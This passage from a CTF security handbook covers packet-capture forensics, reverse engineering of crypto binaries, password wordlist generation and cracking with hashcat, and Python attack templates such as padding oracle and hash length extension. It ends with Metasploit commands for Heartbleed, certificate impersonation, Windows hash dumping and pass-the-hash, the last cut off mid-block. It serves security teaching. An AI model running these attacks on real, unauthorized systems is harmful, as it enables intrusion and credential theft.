PCAP files capture network traffic and are common CTF forensics sources for extracted flags, credentials, or protocol anomalies.

##### Basic PCAP Inspection

Use `tcpdump` to read PCAP files:

```bash
tcpdump -r traffic.pcap
tcpdump -r traffic.pcap -i any
tcpdump -r traffic.pcap | head -50
```

Filter by protocol:

```bash
tcpdump -r traffic.pcap -i any 'tcp port 80'
tcpdump -r traffic.pcap 'udp port 53'
tcpdump -r traffic.pcap 'icmp'
```

##### Wireshark Analysis

Wireshark provides GUI-based packet analysis:

```bash
wireshark traffic.pcap &
```

Or analyze headless with `tshark`:

```bash
tshark -r traffic.pcap -Y 'http.request.method == "POST"'
tshark -r traffic.pcap -Y 'dns.qry.name' -T fields -e dns.qry.name
tshark -r traffic.pcap -Y 'ftp-data' -T fields -e ftp-data.command
```

The `-Y` option filters by display filter (different from `-f` capture filters). The `-T fields -e` options extract specific protocol fields.

##### HTTP Traffic Extraction

Extract HTTP requests and responses:

```bash
tshark -r traffic.pcap -Y 'http' -T fields -e http.request.full_uri -e http.request.method -e http.response.code
```

For POST data containing credentials or flags:

```bash
tshark -r traffic.pcap -Y 'http.request.method == "POST"' -T fields -e http.file_data | xxd
```

Extract files transmitted over HTTP:

```bash
tcpflow -r traffic.pcap
```

This creates a directory structure organizing flows by source and destination IPs. Examine files within for embedded data.

##### DNS Analysis

Extract DNS queries and responses:

```bash
tshark -r traffic.pcap -Y 'dns' -T fields -e dns.qry.name -e dns.resp.addr
```

Exfiltrated data sometimes travels as DNS TXT records or through subdomain naming:

```bash
tshark -r traffic.pcap -Y 'dns.resp.type == "TXT"' -T fields -e dns.resp.name -e dns.resp.txt
```

##### SSL/TLS Decryption

If you have the server's private key or a pre-shared key, configure Wireshark to decrypt traffic. Set the key in Wireshark preferences:

Edit > Preferences > Protocols > SSL > Edit RSA keys list

Alternatively, use `ssldump`:

```bash
ssldump -r traffic.pcap -k /path/to/private.key
```

For session key extraction from a running process, use `sslkeylog.so` preload to write keys to a file, then configure Wireshark's `SSLKEYLOGFILE` environment variable.

##### Steganography Detection

Look for suspicious payloads or protocol anomalies indicating hidden data:

```bash
tshark -r traffic.pcap -Y 'http and (http.response.code == 200)' -T fields -e http.response.body | strings | grep -E '[A-Za-z0-9+/]{50,}={0,2}$'
```

This extracts HTTP response bodies and searches for base64-encoded strings. Extract suspicious blobs for offline analysis:

```bash
tshark -r traffic.pcap -T raw | file -
```

Test with `binwalk`, `strings`, or entropy analysis tools (`ent`) to identify embedded files or compression signatures.

##### Carving from PCAP

Extract raw bytes from specific flows:

```bash
tcpflow -r traffic.pcap -C
```

The `-C` option captures raw TCP content without interpretation. Combine with `file` identification:

```bash
tcpflow -r traffic.pcap -C | file -
```

Related Topics: Memory Forensics (advanced Volatility plugins), File System Forensics (ext4, NTFS analysis), Malware Analysis (identifying malicious payloads in traffic), Cryptographic Artifact Recovery (extracting encryption keys from memory or disk).

---

## Reverse Engineering Crypto

### Binary Analysis Fundamentals

Binary analysis for cryptographic reverse engineering requires identifying crypto implementations, extracting keys, and understanding custom algorithms. The primary tools serve different purposes:

**IDA Pro** provides the most sophisticated disassembly with hex-rays decompiler for readable pseudocode. Launch with `ida64` or `idag64` (GUI). Key features for crypto work:

- Auto-detection of common crypto libraries (OpenSSL, libcrypto)
- FLIRT signatures for recognizing standard implementations
- Cross-reference analysis (`x` key) to trace data flow
- Hex-Rays decompiler (F5) for C-like pseudocode

**Ghidra** (free NSA tool) offers comparable decompilation. Launch with `ghidraRun`. Critical features:

- CodeBrowser for disassembly viewing
- Decompiler window (auto-opens or Window → Decompile)
- Function Graph view for control flow
- Data Type Manager for structure identification

```bash
# Ghidra headless analysis
analyzeHeadless /path/to/project ProjectName -import /path/to/binary -postScript AnalyzeScript.java
```

**Radare2** excels at command-line analysis and scripting:

```bash
r2 -A binary        # Auto-analyze binary
aaa                 # Deep analysis (inside r2)
afl                 # List all functions
pdf @main          # Disassemble main function
iz                 # List strings in data sections
/R aes             # Search for AES instruction patterns
```

Common radare2 crypto hunting commands:

```bash
/c aes             # Search for AES constants (S-box values)
/x 637c777bf26b6fc5  # Search hex for AES S-box start
/R xor             # Find XOR operations
pdf @ sym.encrypt  # Disassemble suspected encryption function
```

### Dynamic Analysis Techniques

Dynamic analysis reveals runtime behavior, key material, and algorithm logic through execution tracing.

**GDB** (GNU Debugger) for breakpoint-based analysis:

```bash
gdb ./crypto_binary
break *0x401234           # Break at address
break encrypt             # Break at function
run input.txt             # Execute with arguments
x/32bx $rsi              # Examine 32 bytes at RSI register (common key location)
x/s $rdi                 # Examine string at RDI
info registers           # Show all register values
stepi                    # Step one instruction
continue                 # Resume execution
```

Key extraction pattern:

```bash
# Break before crypto operation
break *0x401500
commands
  x/16bx $rsi           # Print suspected key
  continue
end
run
```

**GEF** (GDB Enhanced Features) provides crypto-aware enhancements:

```bash
gef➤  pattern create 200        # Create cyclic pattern
gef➤  checksec                  # Check binary protections
gef➤  xinfo 0x7fffffffe000      # Memory region info
gef➤  search-pattern "randomstring"  # Search memory
```

**ltrace** tracks library calls (reveals crypto library usage):

```bash
ltrace ./binary input.txt
ltrace -e '*crypt*' ./binary    # Filter crypto-related calls
ltrace -e 'AES*' ./binary       # Track AES functions
ltrace -o trace.log ./binary    # Save to file
```

Common crypto library calls to monitor:

- `EVP_EncryptInit_ex`, `EVP_DecryptInit_ex` (OpenSSL)
- `AES_set_encrypt_key`, `AES_encrypt` (OpenSSL low-level)
- `MD5_Init`, `SHA256_Init` (hash functions)
- `memcpy` (often copies keys)

**strace** traces system calls (useful for file-based key storage):

```bash
strace ./binary 2>&1 | grep -E 'open|read|write'
strace -e trace=open,read ./binary     # Filter specific syscalls
strace -s 1000 ./binary                # Increase string capture length
strace -xx ./binary                    # Show all bytes in hex
```

Key files to watch:

- `/dev/urandom` reads (RNG usage)
- Configuration file reads
- Network socket operations (`connect`, `send`, `recv`)

### Identifying Cipher Implementation

Recognizing crypto algorithms requires pattern matching against known constants and structures.

**Constant-Based Identification:**

AES detection via S-box values:

```bash
# AES S-box starts with: 63 7c 77 7b f2 6b 6f c5
strings -tx binary | grep "637c777b"
radare2: /x 637c777bf26b6fc5

# Common in disassembly:
movzx eax, byte ptr [rax + 0x12345]  # S-box lookup pattern
```

DES detection via P-box permutations:

```bash
# DES P-box constant: 16 7 20 21 29 12 28 17
# Initial permutation table identifiable
```

RSA detection signatures:

- Modular exponentiation loops
- Large prime checking (Miller-Rabin patterns)
- Barrett reduction implementation
- Montgomery multiplication

**Instruction Pattern Recognition:**

[Inference] Common patterns (actual implementations vary):

XOR cipher characteristics:

```assembly
xor eax, [key_location]    # Repeated XOR operations
loop encryption_loop        # Simple loop structure
```

AES rounds identification:

```assembly
# 10/12/14 rounds depending on key size
# SubBytes → ShiftRows → MixColumns → AddRoundKey pattern
aesenc xmm0, xmm1          # Hardware AES instruction (modern CPUs)
```

RC4 key scheduling:

```assembly
# 256-byte S-box initialization
# KSA (Key Scheduling Algorithm) has characteristic loop
```

**Entropy Analysis:**

```python
# High entropy suggests strong encryption
import math
from collections import Counter

def entropy(data):
    if not data:
        return 0
    counter = Counter(data)
    length = len(data)
    return -sum((count/length) * math.log2(count/length) 
                for count in counter.values())

# Random data: ~8 bits/byte
# English text: ~4-5 bits/byte
# Encrypted data: ~7.9-8 bits/byte
```

### Key Extraction from Binary

**Static Key Extraction:**

Hardcoded keys in `.data` or `.rodata` sections:

```bash
# Radare2
iz                          # Strings in data section
izz                         # All strings including binary
px 32 @ obj.key            # Print 32 bytes at key object

# Objdump
objdump -s -j .rodata binary
objdump -s -j .data binary

# Hexdump patterns
hexdump -C binary | grep -A5 "possible_key_start"
```

Base64-encoded embedded keys:

```bash
strings binary | grep -E '^[A-Za-z0-9+/]{20,}={0,2}$' | base64 -d
```

**Dynamic Key Extraction:**

Memory dumping at crypto function entry:

```python
# GDB Python scripting
import gdb

class DumpKey(gdb.Breakpoint):
    def stop(self):
        # Dump RSI register (common key parameter in x64)
        key_addr = gdb.parse_and_eval("$rsi")
        key_data = gdb.selected_inferior().read_memory(key_addr, 32)
        with open("extracted_key.bin", "wb") as f:
            f.write(key_data.tobytes())
        return False  # Continue execution

DumpKey("*0x401234")  # Set at encryption function
gdb.execute("run")
```

Frida dynamic instrumentation:

```javascript
// Attach to process and hook encryption
Interceptor.attach(Module.findExportByName(null, "AES_set_encrypt_key"), {
    onEnter: function(args) {
        console.log("Key length:", args[1].toInt32());
        console.log("Key data:", hexdump(args[0], {
            length: args[1].toInt32() / 8
        }));
    }
});
```

**Practical CTF Workflow:**

1. **Initial reconnaissance:**

```bash
file binary
strings binary | less
rabin2 -I binary        # Binary info (radare2)
checksec binary          # Security features
```

2. **Static analysis for crypto signatures:**

```bash
r2 -A binary
afl | grep -i 'crypt\|aes\|rsa\|des'
/c aes                   # Search constants
```

3. **Dynamic tracing:**

```bash
ltrace -e '*' ./binary 2>&1 | tee trace.log
strace -xx ./binary 2>&1 | tee syscalls.log
```

4. **Targeted debugging:**

```bash
gdb ./binary
break *identified_crypto_function
run
x/64bx $rsi              # Examine key parameter
```

5. **Key validation:**

```python
# Test extracted key
from Crypto.Cipher import AES
key = bytes.fromhex("extracted_key_hex")
cipher = AES.new(key, AES.MODE_ECB)
plaintext = cipher.decrypt(ciphertext)
print(plaintext)
```

### Tool-Specific CTF Scenarios

**Scenario: Custom XOR with obfuscated key**

```bash
# 1. Identify XOR loop
r2 -A challenge
pdf @ main
# Look for: xor instruction, loop structure

# 2. Extract key derivation
gdb ./challenge
break *xor_loop_address
run
# Step through key generation
si
info registers
```

**Scenario: OpenSSL wrapper binary**

```bash
# Identify OpenSSL usage
ltrace ./wrapper 2>&1 | grep EVP_
# Shows: EVP_DecryptInit_ex, EVP_CIPHER_CTX_new

# Extract cipher mode and key
gdb ./wrapper
break EVP_DecryptInit_ex
run
# $rdi = context, $rsi = cipher type, $rdx = engine
# $rcx = key, $r8 = IV
x/16bx $rcx              # Print key
x/16bx $r8               # Print IV
```

**Scenario: Hardware AES instructions**

```bash
# Modern binaries use AESNI instructions
r2 -A modern_crypto
/R aesenc                # Find AES-NI usage
pdf @ hit_address

# Key schedule visible in registers
gdb ./modern_crypto
break *before_aesenc
run
info registers xmm       # XMM registers hold round keys
```

### Common CTF Anti-Analysis Techniques

**Debugger detection bypass:**

```bash
# ptrace anti-debug
gdb: catch syscall ptrace
# Patch return value: set $rax = 0

# Timing checks
gdb: set disable-randomization off
# Skip timing check: jump over_timing_check
```

**String obfuscation:**

```python
# Automated deobfuscation
import string
def xor_decrypt(data, key):
    return bytes(a ^ b for a, b in zip(data, key * (len(data)//len(key)+1)))

# Try common keys
for key in [b'key', b'password', b'\x42']:
    result = xor_decrypt(encrypted_strings, key)
    if all(c in string.printable.encode() for c in result):
        print(result)
```

### Important Related Topics

For comprehensive crypto CTF coverage, explore:

- **Side-Channel Analysis** - Timing attacks, power analysis, cache timing
- **Padding Oracle Attacks** - CBC mode exploitation, PKCS#7 errors
- **Custom Cipher Breaking** - Frequency analysis, known-plaintext attacks
- **Format String Exploitation** - Memory disclosure for key extraction

---

## Wordlist & Dictionary Generation

### Crunch - Custom Wordlist Generation

Crunch generates wordlists based on specified character sets and patterns, essential for CTF password cracking and brute-force scenarios.

#### Basic Syntax

bash

```bash
crunch <min-length> <max-length> [character-set] [options]
```

#### Character Set Specification

bash

```bash
# Lowercase only
crunch 6 8 abcdefghijklmnopqrstuvwxyz -o wordlist.txt

# Mixed case + numbers
crunch 4 6 -f /usr/share/crunch/charset.lst mixalpha-numeric -o output.txt

# Custom character set
crunch 5 5 abc123 -o custom.txt
```

#### Pattern-Based Generation

bash

```bash
# @ = lowercase letters
# , = uppercase letters
# % = numbers
# ^ = special characters

# Pattern: 3 letters + 2 numbers
crunch 5 5 -t @@@%% -o pattern.txt

# CTF flag format: flag{5 lowercase}
crunch 10 10 -t flag{@@@@@} -o ctf_flags.txt

# Known prefix/suffix
crunch 8 8 -t pass@@@% -o passwords.txt
```

#### Size Management

bash

```bash
# Limit output size (MB)
crunch 6 8 abc123 -c 100 -o START

# Split into multiple files
crunch 7 7 -f /usr/share/crunch/charset.lst lalpha -b 50mb -o wordlist

# Piping directly to tools (memory efficient)
crunch 4 6 abc123 | aircrack-ng -w - capture.cap
```

#### Advanced Options

bash

```bash
# Suppress duplicates
crunch 4 4 abc -d 2@ -o unique.txt

# Permutation mode (rearrange input)
crunch 5 5 -p abc123 def456 -o permute.txt

# Invert character set (exclude characters)
crunch 6 6 -i -t @@@@%% -o inverted.txt

# Resume generation from specific string
crunch 5 5 abc123 -s aa3c1 -o resume.txt
```

### Common CTF Wordlists

#### RockYou

bash

```bash
# Location on Kali
/usr/share/wordlists/rockyou.txt.gz

# Extract
gunzip /usr/share/wordlists/rockyou.txt.gz

# First 1000 lines (quick tests)
head -n 1000 /usr/share/wordlists/rockyou.txt > rockyou_small.txt
```

#### SecLists

bash

```bash
# Install
sudo apt install seclists

# Common locations
/usr/share/seclists/Passwords/
/usr/share/seclists/Passwords/Common-Credentials/
/usr/share/seclists/Passwords/Leaked-Databases/

# CTF-specific
/usr/share/seclists/Passwords/common-credentials.txt
/usr/share/seclists/Passwords/darkweb2017-top10000.txt
```

#### CeWL - Website Wordlist Generator

bash

```bash
# Basic crawl
cewl http://target.ctf -w custom_wordlist.txt

# Depth control + minimum word length
cewl -d 3 -m 5 http://target.ctf -w wordlist.txt

# Include metadata and email addresses
cewl -d 2 -m 4 --meta --email http://target.ctf -w complete.txt

# Authentication
cewl -d 2 http://target.ctf --auth_user admin --auth_pass pass123 -w auth_wordlist.txt

# Custom user-agent
cewl -d 2 http://target.ctf -u "Mozilla/5.0" -w wordlist.txt
```

### Hashcat Rule-Based Mutations

Hashcat rules transform wordlist entries to generate variations, significantly expanding coverage without massive wordlists.

#### Common Rule Files

bash

```bash
# Kali default location
/usr/share/hashcat/rules/

# Best64 (balanced speed/coverage)
hashcat -a 0 -m 0 hashes.txt wordlist.txt -r /usr/share/hashcat/rules/best64.rule

# Dive (aggressive)
hashcat -a 0 -m 0 hashes.txt wordlist.txt -r /usr/share/hashcat/rules/dive.rule

# Leetspeak
hashcat -a 0 -m 0 hashes.txt wordlist.txt -r /usr/share/hashcat/rules/leetspeak.rule
```

#### Custom Rule Syntax

**Basic Operations:**

```
: - Do nothing (test)
l - Lowercase all
u - Uppercase all
c - Capitalize first letter
C - Lowercase first, uppercase rest
t - Toggle case of all characters
r - Reverse word
d - Duplicate word
```

**Append/Prepend:**

```
$X - Append character X
^X - Prepend character X
$1$2$3 - Append "123"
^!^@ - Prepend "@!"
```

**Examples:**

bash

```bash
# Create custom rule file
echo '$1' > myrules.rule
echo '$2' >> myrules.rule
echo '$3' >> myrules.rule
echo '$!' >> myrules.rule
echo 'c' >> myrules.rule

# Apply custom rules
hashcat -a 0 -m 0 hash.txt wordlist.txt -r myrules.rule
```

**CTF-Specific Rules:**

```
# flag{word}
^{ $} ^g ^a ^l ^f
# WORD123
u $1 $2 $3
# word2023
$2 $0 $2 $3
# W0rd (leetspeak)
c so0 sa4 se3
```

#### Multi-Rule Application

bash

```bash
# Chain multiple rule files
hashcat -a 0 -m 0 hash.txt wordlist.txt -r best64.rule -r toggles1.rule

# Generate ruleset output without cracking
hashcat --stdout wordlist.txt -r best64.rule > mutated_wordlist.txt
```

### Context-Based Word Generation

#### CUPP - Common User Password Profiler

bash

```bash
# Interactive mode
cupp -i

# Generates wordlist based on:
# - Target name, surname, nickname
# - Birthdate, partner info
# - Pet names, company names
# - Keywords from OSINT

# Configuration file mode
cupp -w custom_profile.cfg -l

# Download default wordlists
cupp -d
```

#### Mentalist

bash

```bash
# GUI-based tool (if available)
mentalist

# Features:
# - Base words with attribute chains
# - Case mutations
# - Substitutions (l33t speak)
# - Append/prepend patterns
# - Date ranges
```

#### Manual Context-Based Generation

**Combine Context Words:**

bash

```bash
# Input: company.txt (target info)
# Output: combined wordlist

# Simple concatenation
while read word1; do
  while read word2; do
    echo "${word1}${word2}"
  done < years.txt
done < company.txt > combined.txt

# With separator variations
for word in $(cat base.txt); do
  for num in {0..99}; do
    echo "${word}${num}"
    echo "${word}_${num}"
    echo "${word}-${num}"
  done
done > variations.txt
```

**Date-Based Generation:**

bash

```bash
# Years 2015-2025
crunch 4 4 -t 20%% -s 2015 -e 2025 -o years.txt

# Dates in DDMMYYYY format
crunch 8 8 0123456789 -t %%0%202% -o dates.txt

# Common password patterns with years
for year in {2015..2025}; do
  echo "Password${year}"
  echo "password${year}"
  echo "Pass@${year}"
done > year_passwords.txt
```

#### Username-to-Password Mutations

bash

```bash
# Extract usernames from various sources
cat users.txt | while read user; do
  echo "$user"
  echo "${user}123"
  echo "${user}2023"
  echo "${user}!"
  echo "${user}@123"
  echo "$(echo $user | tr '[:lower:]' '[:upper:]')"
done > user_passwords.txt
```

### Wordlist Manipulation & Filtering

#### Remove Duplicates

bash

```bash
# Sort and deduplicate
sort -u wordlist.txt -o wordlist_unique.txt

# Using awk (faster for large files)
awk '!seen[$0]++' wordlist.txt > unique.txt
```

#### Length Filtering

bash

```bash
# Keep only 8-12 character passwords
awk 'length($0) >= 8 && length($0) <= 12' wordlist.txt > filtered.txt

# Remove passwords shorter than 6
awk 'length($0) >= 6' wordlist.txt > min6.txt
```

#### Pattern Matching

bash

```bash
# Only alphanumeric
grep -E '^[a-zA-Z0-9]+$' wordlist.txt > alphanum.txt

# Must contain at least one number
grep '[0-9]' wordlist.txt > with_numbers.txt

# Must contain special character
grep -E '[^a-zA-Z0-9]' wordlist.txt > with_special.txt

# Starts with capital letter
grep '^[A-Z]' wordlist.txt > capital_start.txt
```

#### Combine Multiple Wordlists

bash

```bash
# Merge and deduplicate
cat list1.txt list2.txt list3.txt | sort -u > combined.txt

# Prioritize specific lists
cat priority.txt rockyou.txt | awk '!seen[$0]++' > merged.txt
```

### Memory-Efficient Techniques

#### Piping to Crackers

bash

```bash
# Direct piping (no file creation)
crunch 6 8 abc123 | john --stdin hash.txt

# John the Ripper with rules via stdin
crunch 4 6 abcdefghijklmnopqrstuvwxyz | john --stdin --rules hash.txt

# Hashcat from stdin (hybrid mode)
crunch 4 4 abc123 | hashcat -a 0 -m 0 hash.txt
```

#### Incremental Generation

bash

```bash
# Generate on-the-fly with john
john --incremental=alpha hash.txt

# Custom charset for john
# Edit /etc/john/john.conf
[Incremental:CTF]
File = $JOHN/alpha.chr
MinLen = 4
MaxLen = 8
CharCount = 26
```

### CTF-Specific Scenarios

#### Flag Format Wordlists

bash

```bash
# Common CTF flag patterns
echo "CTF{" > prefixes.txt
echo "flag{" >> prefixes.txt
echo "FLAG{" >> prefixes.txt

# Generate with crunch
crunch 8 15 -t CTF{@@@@@} -o ctf_flags.txt

# Base64 encoded flags
cat potential_flags.txt | base64 > b64_flags.txt
```

#### Crypto Challenge Wordlists

bash

```bash
# Common crypto terms
cat > crypto_words.txt << EOF
aes
rsa
des
md5
sha
cipher
key
encrypt
decrypt
block
stream
EOF

# Generate variations
hashcat --stdout crypto_words.txt -r best64.rule > crypto_variations.txt
```

#### Steganography Passwords

bash

```bash
# Short, meaningful words
/usr/share/dict/words | awk 'length($0) <= 8' > short_words.txt

# Common stego passwords from CTF experience
cat > stego_common.txt << EOF
password
secret
hidden
admin
root
EOF
```

**Important Note:** [Inference] The effectiveness of wordlist generation depends heavily on challenge context. Password complexity requirements, rate limiting, and hash algorithms significantly impact success rates. Always analyze the target environment before generating large wordlists.

---

## Scripting & Automation

### Python Crypto Libraries (pycryptodome, cryptography)

#### PyCryptodome Library

**Installation and Setup**

```bash
pip3 install pycryptodome
# or for Debian/Kali
apt install python3-pycryptodome
```

**Core Modules Structure**

- `Crypto.Cipher` - Symmetric/asymmetric encryption
- `Crypto.Hash` - Hashing algorithms
- `Crypto.PublicKey` - RSA, DSA, ECC key operations
- `Crypto.Util` - Padding, number theory utilities
- `Crypto.Random` - Cryptographic random generation

**AES Operations**

```python
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from Crypto.Random import get_random_bytes

# Encryption
key = get_random_bytes(16)  # AES-128
cipher = AES.new(key, AES.MODE_CBC)
ct = cipher.encrypt(pad(b'plaintext', AES.block_size))
iv = cipher.iv

# Decryption
decipher = AES.new(key, AES.MODE_CBC, iv=iv)
pt = unpad(decipher.decrypt(ct), AES.block_size)
```

**ECB Mode Exploitation Pattern**

```python
from Crypto.Cipher import AES

def ecb_oracle(plaintext, key):
    cipher = AES.new(key, AES.MODE_ECB)
    return cipher.encrypt(pad(plaintext, 16))

# Block duplication detection
def detect_ecb(ciphertext, block_size=16):
    blocks = [ciphertext[i:i+block_size] for i in range(0, len(ciphertext), block_size)]
    return len(blocks) != len(set(blocks))

# Byte-at-a-time ECB decryption
def ecb_decrypt_byte(oracle, known, block_size=16):
    for i in range(256):
        test = b'A' * (block_size - len(known) - 1) + known + bytes([i])
        if oracle(test)[:block_size] == oracle(b'A' * (block_size - len(known) - 1))[:block_size]:
            return bytes([i])
```

**RSA Key Operations**

```python
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
import binascii

# Key generation
key = RSA.generate(2048)
private_key = key.export_key()
public_key = key.publickey().export_key()

# Encryption/Decryption
public_key_obj = RSA.import_key(public_key)
cipher = PKCS1_OAEP.new(public_key_obj)
ciphertext = cipher.encrypt(b'message')

private_key_obj = RSA.import_key(private_key)
decipher = PKCS1_OAEP.new(private_key_obj)
plaintext = decipher.decrypt(ciphertext)

# Raw RSA operations (no padding)
n = public_key_obj.n
e = public_key_obj.e
message_int = int.from_bytes(b'test', 'big')
ciphertext_int = pow(message_int, e, n)
```

**Common Number Attack Template**

```python
from Crypto.PublicKey import RSA
from math import gcd

def common_modulus_attack(c1, c2, e1, e2, n):
    # When same message encrypted with same n, different e
    def egcd(a, b):
        if a == 0:
            return (b, 0, 1)
        gcd_val, x1, y1 = egcd(b % a, a)
        x = y1 - (b // a) * x1
        y = x1
        return (gcd_val, x, y)
    
    _, s1, s2 = egcd(e1, e2)
    if s1 < 0:
        c1 = pow(c1, -s1, n)
        s1 = -s1
    if s2 < 0:
        c2 = pow(c2, -s2, n)
        s2 = -s2
    
    return (pow(c1, s1, n) * pow(c2, s2, n)) % n

# Usage
n = 0x... # shared modulus
c1, c2 = 0x..., 0x...
e1, e2 = 3, 5
plaintext_int = common_modulus_attack(c1, c2, e1, e2, n)
```

#### Cryptography Library

**Installation**

```bash
pip3 install cryptography
```

**High-Level Fernet Symmetric Encryption**

```python
from cryptography.fernet import Fernet

# Key generation
key = Fernet.generate_key()
cipher = Fernet(key)

# Encryption/Decryption
token = cipher.encrypt(b"secret data")
plaintext = cipher.decrypt(token)
```

**Low-Level AES-GCM**

```python
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
import os

key = AESGCM.generate_key(bit_length=256)
aesgcm = AESGCM(key)
nonce = os.urandom(12)

ciphertext = aesgcm.encrypt(nonce, b"plaintext", b"associated_data")
plaintext = aesgcm.decrypt(nonce, ciphertext, b"associated_data")
```

**X.509 Certificate Parsing**

```python
from cryptography import x509
from cryptography.hazmat.backends import default_backend

with open("cert.pem", "rb") as f:
    cert_data = f.read()
    cert = x509.load_pem_x509_certificate(cert_data, default_backend())

print(f"Subject: {cert.subject}")
print(f"Issuer: {cert.issuer}")
print(f"Serial: {cert.serial_number}")
print(f"Not valid before: {cert.not_valid_before_utc}")
print(f"Not valid after: {cert.not_valid_after_utc}")
```

**RSA Signature Verification**

```python
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import rsa, padding

# Load public key
with open("public_key.pem", "rb") as f:
    public_key = serialization.load_pem_public_key(f.read())

# Verify signature
try:
    public_key.verify(
        signature,
        message,
        padding.PSS(
            mgf=padding.MGF1(hashes.SHA256()),
            salt_length=padding.PSS.MAX_LENGTH
        ),
        hashes.SHA256()
    )
    print("Signature valid")
except:
    print("Signature invalid")
```

**HMAC Operations**

```python
from cryptography.hazmat.primitives import hashes, hmac

h = hmac.HMAC(key, hashes.SHA256())
h.update(b"message")
signature = h.finalize()

# Verification
h2 = hmac.HMAC(key, hashes.SHA256())
h2.update(b"message")
h2.verify(signature)  # Raises exception if invalid
```

### Automated Attack Chains

#### Generic CTF Crypto Attack Framework

**Modular Attack Structure**

```python
import hashlib
import itertools
from Crypto.Util.number import long_to_bytes, bytes_to_long

class CryptoAttack:
    def __init__(self, ciphertext=None, public_key=None):
        self.ciphertext = ciphertext
        self.public_key = public_key
        self.results = []
    
    def register_attack(self, name, func):
        self.results.append({
            'name': name,
            'function': func
        })
    
    def execute_all(self):
        for attack in self.results:
            try:
                result = attack['function']()
                if result:
                    print(f"[+] {attack['name']}: SUCCESS")
                    print(f"    Result: {result}")
                    return result
            except Exception as e:
                print(f"[-] {attack['name']}: FAILED ({str(e)})")
        return None

# Usage example
def weak_rsa_attack(n, e, c):
    attack = CryptoAttack(ciphertext=c)
    
    # Register multiple attacks
    attack.register_attack("Small e", lambda: small_e_attack(n, e, c))
    attack.register_attack("Fermat", lambda: fermat_factorization(n, e, c))
    attack.register_attack("Wiener", lambda: wiener_attack(n, e, c))
    
    return attack.execute_all()
```

**Hash Length Extension Attack Automation**

```python
import hashpumpy

def hash_extension_attack(original_data, original_hash, append_data, key_length):
    """
    Automate hash length extension attacks
    """
    # Supports MD5, SHA1, SHA256, SHA512
    algorithms = ['md5', 'sha1', 'sha256', 'sha512']
    
    for algo in algorithms:
        try:
            new_hash, new_data = hashpumpy.hashpump(
                original_hash,
                original_data,
                append_data,
                key_length
            )
            print(f"[+] {algo.upper()} extension:")
            print(f"    New hash: {new_hash}")
            print(f"    New data: {new_data.hex()}")
        except Exception as e:
            print(f"[-] {algo.upper()}: {e}")
```

**XOR Analysis Chain**

```python
def automated_xor_analysis(ciphertext):
    """
    Run multiple XOR-based attacks
    """
    results = {}
    
    # Single-byte XOR bruteforce
    def single_byte_xor():
        candidates = []
        for key in range(256):
            plaintext = bytes([b ^ key for b in ciphertext])
            score = sum([c in b'etaoinshrdlu ETAOINSHRDLU' for c in plaintext])
            candidates.append((score, key, plaintext))
        return max(candidates)[2]
    
    # Repeating-key XOR with known plaintext
    def extract_key(known_plaintext, position=0):
        key = bytes([c ^ p for c, p in zip(ciphertext[position:], known_plaintext)])
        return key
    
    # Detect key length via Hamming distance
    def detect_keysize(max_keysize=40):
        distances = []
        for keysize in range(2, max_keysize + 1):
            blocks = [ciphertext[i:i+keysize] for i in range(0, len(ciphertext), keysize)][:4]
            if len(blocks) < 2:
                continue
            dist = sum([hamming_distance(blocks[i], blocks[i+1]) for i in range(len(blocks)-1)])
            normalized = dist / (keysize * (len(blocks) - 1))
            distances.append((normalized, keysize))
        return sorted(distances)[:3]
    
    results['single_byte'] = single_byte_xor()
    results['likely_keysizes'] = detect_keysize()
    
    return results

def hamming_distance(b1, b2):
    return sum(bin(x ^ y).count('1') for x, y in zip(b1, b2))
```

#### Network Protocol Attack Automation

**TLS Downgrade Detection Script**

```python
import socket
import ssl

def test_tls_versions(host, port=443):
    protocols = {
        'SSLv3': ssl.PROTOCOL_SSLv23,  # Note: Deprecated
        'TLSv1.0': ssl.PROTOCOL_TLSv1,
        'TLSv1.1': ssl.PROTOCOL_TLSv1_1,
        'TLSv1.2': ssl.PROTOCOL_TLSv1_2,
        'TLSv1.3': ssl.PROTOCOL_TLS
    }
    
    results = {}
    for name, protocol in protocols.items():
        try:
            context = ssl.SSLContext(protocol)
            with socket.create_connection((host, port)) as sock:
                with context.wrap_socket(sock, server_hostname=host) as ssock:
                    results[name] = {
                        'supported': True,
                        'cipher': ssock.cipher(),
                        'version': ssock.version()
                    }
        except Exception as e:
            results[name] = {'supported': False, 'error': str(e)}
    
    return results
```

**Padding Oracle Attack Automation**

```python
def padding_oracle_attack(oracle_function, ciphertext, block_size=16, iv=None):
    """
    oracle_function: Takes ciphertext, returns True if padding valid
    """
    blocks = [ciphertext[i:i+block_size] for i in range(0, len(ciphertext), block_size)]
    if iv:
        blocks.insert(0, iv)
    
    plaintext = b''
    
    for block_num in range(len(blocks) - 1, 0, -1):
        current_block = bytearray(blocks[block_num])
        previous_block = bytearray(blocks[block_num - 1])
        decrypted_block = bytearray(block_size)
        
        for pad_value in range(1, block_size + 1):
            for byte_val in range(256):
                previous_block[-pad_value] = byte_val
                
                # Adjust already known bytes
                for known in range(1, pad_value):
                    previous_block[-known] = decrypted_block[-known] ^ pad_value
                
                test_ct = bytes(previous_block) + bytes(current_block)
                
                if oracle_function(test_ct):
                    decrypted_block[-pad_value] = byte_val ^ pad_value ^ blocks[block_num - 1][-pad_value]
                    break
        
        plaintext = bytes(decrypted_block) + plaintext
    
    return plaintext
```

### Exploit Framework (Metasploit)

#### Metasploit Crypto-Related Modules

**SSL/TLS Vulnerability Scanning**

```bash
# Heartbleed detection and exploitation
msfconsole -q -x "use auxiliary/scanner/ssl/openssl_heartbleed; \
set RHOSTS target.com; set RPORT 443; set VERBOSE true; run; exit"

# SSL version detection
use auxiliary/scanner/ssl/ssl_version
set RHOSTS 192.168.1.0/24
set THREADS 10
run

# Weak cipher detection
use auxiliary/scanner/ssl/ssl_cipher
set RHOSTS target.com
set RPORT 443
run
```

**Certificate Manipulation**

```bash
# SSL certificate impersonation
use auxiliary/gather/impersonate_ssl
set RHOST target.com
set RPORT 443
run

# Extract certificate information
use auxiliary/scanner/ssl/cert_validator
set RHOSTS target.com
run
```

**Password Hash Extraction and Cracking Integration**

```bash
# Post-exploitation hash dump
use post/windows/gather/hashdump
set SESSION 1
run

# Automatic John the Ripper integration
use auxiliary/analyze/jtr_crack_fast
set JOHN_BASE /usr/share/john
run

# Pass-the-hash authentication
use exploit/windows/smb/psexec
set RHOSTS 192.168.1.50
